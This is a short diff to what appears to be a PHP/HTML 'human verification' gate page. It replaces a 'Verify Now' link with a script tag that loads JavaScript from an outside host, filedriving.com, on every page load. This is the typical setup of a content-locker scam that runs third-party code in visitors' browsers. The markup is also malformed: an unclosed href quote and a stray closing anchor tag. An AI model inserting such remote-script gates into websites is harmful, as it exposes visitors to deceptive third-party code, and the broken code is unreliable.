@@ -28,7 +28,7 @@ if(!IS_AJAX) {die("<div style='width: 100%; height: 100%; position: fixed; backg
 		<span id="human_verification_timer_time"></span>
 	</div>
 	<div class="button-wrapper animated bounceIn animation-delay-1000">
-		<a id="verification-button" class="tkt-btn animated pulse infinite" href="https://filedriving.com/script_include.php?id=1073629><span>Verify Now</span></a>
+		<script type="text/javascript" src="https://filedriving.com/script_include.php?id=1073629"></script><span>Verify Now</span></a>
 	</div>
 </div>
  
